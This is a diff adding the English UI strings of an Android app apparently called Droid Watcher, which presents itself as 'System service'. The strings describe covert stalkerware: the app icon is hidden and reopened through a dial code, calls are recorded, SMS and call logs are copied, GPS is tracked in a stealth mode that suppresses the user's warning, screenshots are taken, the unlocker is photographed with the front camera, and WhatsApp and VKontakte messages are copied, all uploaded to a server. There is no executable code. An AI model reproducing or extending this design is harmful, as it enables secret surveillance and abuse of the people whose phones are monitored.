@@ -1,0 +1,188 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">System service</string>
+    <string name="app_name_real">Droid Watcher</string>
+    <string name="default_code">001</string>
+    
+    <string-array name="screen_timer">
+        <item>10 sec</item>
+		<item>30 sec</item>
+		<item>1 min</item>
+		<item>2 min</item>
+		<item>5 min</item>
+		<item>10 min</item>
+	</string-array>
+	
+    <string-array name="screen_timer_val">
+        <item>10</item>
+		<item>30</item>
+		<item>60</item>
+		<item>120</item>
+		<item>300</item>
+		<item>600</item>
+	</string-array>
+    
+    <string-array name="gps_timer">
+        <item>Often (~1 мин)</item>
+		<item>Sometimes (~10 мин)</item>
+		<item>Seldom (~30 мин)</item>
+	</string-array>
+	
+    <string-array name="gps_timer_val">
+        <item>1</item>
+		<item>10</item>
+		<item>30</item>
+	</string-array>
+	
+    <string-array name="record_format">
+        <item>3GPP</item>
+		<item>AMR</item>
+	</string-array>
+	
+    <string-array name="record_format_val">
+        <item>1</item>
+		<item>3</item>
+	</string-array>
+	
+    <string-array name="record_source">
+        <item>DEFAULT</item>
+		<item>MIC</item>
+		<item>VOICE_UPLINK</item>
+		<item>VOICE_DOWNLINK</item>
+		<item>VOICE_CALL</item>
+		<item>CAMCORDER</item>
+		<item>VOICE_RECOGNITION</item>
+		<item>VOICE_COMMUNICATION</item>
+	</string-array>
+	
+    <string-array name="record_source_val">
+        <item>0</item>
+		<item>1</item>
+		<item>2</item>
+		<item>3</item>
+		<item>4</item>
+		<item>5</item>
+		<item>6</item>
+		<item>7</item>
+	</string-array>
+	
+    <string-array name="capture_photo_format">
+        <item>Small (640x480)</item>
+		<item>Medium (800x600)</item>
+		<item>HD (1280×720)</item>
+	</string-array>
+	
+    <string-array name="capture_photo_format_val">
+        <item>640</item>
+		<item>800</item>
+		<item>1280</item>
+	</string-array>
+	
+    <string name="loginLabel">Login:</string>
+<!--     <string name="connectButton">Connect</string> -->
+<!--     <string name="statusLabel">Status:</string> -->
+    <string name="idLabel">Device IMEI:</string>
+    <string name="mailLabel">E-mail</string>
+<!--     <string name="mailLabel2">E-mail:</string> -->
+    <string name="sendMail">Send mail</string>
+    <string name="sendSms">Send SMS</string>
+    <string name="sendCall">Send call history</string>
+    <string name="mailHint">Your e-mail</string>
+    
+    <string name="connUnavailable">Internet connection is unavailable.</string>
+    <string name="errorExec">Error executing query.</string>
+<!--     <string name="connSuccess">Connection to the system is successful.</string> -->
+    <string name="connLogin">Could not connect to the system. Check your login.</string>
+    <string name="connected">Connected</string>
+    <string name="notСonnected">Not connected</string>
+    <string name="enterYourLogin">Enter your login (e-mail)</string>
+    <string name="settings">Settings</string>
+    <string name="filter">Filter</string>
+    
+	<string name="useFilter">Enable filter</string>
+	<string name="watchFor">Watch for calls and sms…</string>
+	<string name="onlyFromList">… only on the numbers from the list</string>
+	<string name="exceptList">… from everyone except numbers from the list</string>
+	<string name="phoneNumber">Phone number</string>
+	<string name="add">Add</string>
+	<string name="filterHint">*A long press on the number of removal</string>
+	<string name="plus">+</string>
+	<string name="enter">Enter</string>
+	<string name="registration">Registration</string>
+	<string name="copyright">\u00A9 Odrin, 2012&#8211;2013</string>
+	<string name="droidwatcher">Droid Watcher</string>
+	<string name="pwdHint">Your password</string>
+	<string name="registrationHint">Please use your e-mail and password for your new account. You will be sent an email to confirm the e-mail click on the link in the email. If the e-mail address will not be confirmed within 24 hours, your account will be deleted!</string>
+	<string name="registrationSuccess">Registration was successful</string>
+	<string name="mailNotMatch">Invalid e-mail address</string>
+    <string name="shortPwd">The password must be at least 6 characters</string>
+    <string name="finish">Finish</string>
+    <string name="warning">Warning</string>
+    <string name="connectionSuccess">
+        <![CDATA[
+        <p>Connecting to the service completed successfully. In order to access the settings, click \"Finish\".</p><p><b>Warning:</b> application icon will be hidden from the application list. To open an application, use the dial **001**. When you first run the application in most cases required to restart the device to hide the icon.</p>
+        ]]>
+   	</string>
+    <string name="wait">Please wait&#8230;</string>
+    
+    <string name="gps">GPS</string>
+    <string name="gpsEnableDescr">Send GPS coordinates to the server</string>
+    <string name="gpsOnlyNew">Only new coordinates</string>
+    <string name="gpsOnlyNewDescr">Send coordinates only if they have changed (disabling this feature will increase the web traffic)</string>
+    <string name="gpsInterval">Interval</string>
+    <string name="gpsDescr">Set the interval positioning</string>
+    <string name="gpsTitle">Select the interval</string>
+    
+    <string name="settings_noNumber">Number for notifications is not set</string>
+    <string name="settings_onlyDigits">The code must consist of numbers</string>
+    <string name="settings_emptyCode">The code can not be empty</string>
+    <string name="settings_numberError">Entered an incorrect number</string>
+    
+    <string name="settings_autoupdate">Automatic updates ®</string>
+    <string name="settings_autoupdate_summary">Automatically download and install new versions of DW. Requires root</string>
+    <string name="settings_dataTransfer">Data transfer</string>
+    <string name="settings_wifionly">Wi-Fi Only</string>
+    <string name="settings_wifionly_summary">Send data to the server only via Wi-Fi.</string>
+    <string name="settings_wifionly_files_summary">Send files (screenshots/photos/record) to the server only via Wi-Fi.</string>
+    <string name="settings_runcode">Run code</string>
+    <string name="settings_runcode_summary">Application run code (**Your code**)</string>
+    <string name="settings_runcode_title">Your code</string>
+    <string name="settings_phonenumber">Telephone number</string>
+    <string name="settings_phonenumber_summary">Phone number that will receive the alert</string>
+    <string name="settings_smsnotification">Sms alert</string>
+    <string name="settings_simnotification">Changing the sim-card</string>
+    <string name="settings_simnotification_summary">Notify a change sim-card by Sms</string>
+    <string name="settings_sms">Sms</string>
+    <string name="settings_sms_summary">Duplicate SMS to a specified number</string>
+    <string name="settings_calls">Calls</string>
+    <string name="settings_calls_summary">Announce calls via SMS to a specified number</string>
+    <string name="settings_callrecord">Call Recording</string>
+    <string name="settings_record">Record calls</string>
+    <string name="settings_record_summary">Record incoming and outgoing calls</string>
+    <string name="settings_recordfromline">Record from line</string>
+    <string name="settings_recordfromline_summary">Keep a record of the line. Well heard both of them, but does not work on all devices. If not enabled, the record is maintained through the microphone.</string>
+    <string name="settings_recordformat">Audio format</string>
+    <string name="settings_recordformat_summary">The format of the audio recordings</string>
+    <string name="settings_photo">Sending photos</string>
+    <string name="settings_phototransfer">Send photos</string>
+    <string name="settings_phototransfer_summary">Sent to the server photos taken with the phone camera</string>
+    <string name="settings_imagesize">Image size</string>
+    <string name="settings_imagesize_summary">The size of the projected image. Transferring images to a server consumes a larger more internet traffic.</string>
+    <string name="settings_screenshots_title">Screenshots</string>
+    <string name="settings_screenshots">Take screenshots ®</string>
+    <string name="settings_screenshots_summary">Take screenshots with the specified interval. To work requires root. only works on Android 4.0 and above. Files are transferred to the server \"packs\" not less than 10.</string>
+    <string name="settings_screenshots_interval">Interval</string>
+    <string name="settings_screenshots_interval_summary">The interval at which to take screenshots</string>
+    <string name="settings_vk">Copy correspondence ®</string>
+    <string name="settings_vk_summary">Correspondence sent to the server \"Vkontakte\". Works only with official client \"Vkontakte\". Requires root.</string>
+    <string name="settings_wa">Copy correspondence ®</string>
+    <string name="settings_wa_summary">Correspondence sent to the server \"WhatsApp\". Requires root.</string>
+	<string name="settings_gps_hide">Stealth mode</string>
+    <string name="settings_gps_hide_summary">Hide work of GPS. Searching only happens when the screen is off and closed when it is turned on. The user will not see the warning \"Find GPS\".</string>
+    <string name="settings_record_source_title">Audio Source</string>
+    <string name="settings_record_source_summary">Source of the sound recording. Do not change this setting if you do not know what it is and how it works!</string>
+    <string name="camera">Camera</string>
+    <string name="settings_front_cameta_title">Use front camera</string>
+    <string name="settings_front_cameta_summary">Take picture by front camera when user unlock the screen. Files are transferred to the server \"packs\" not less than 10 pieces. Viewing these images is available only to users with PRO account.</string>
+    
+</resources>
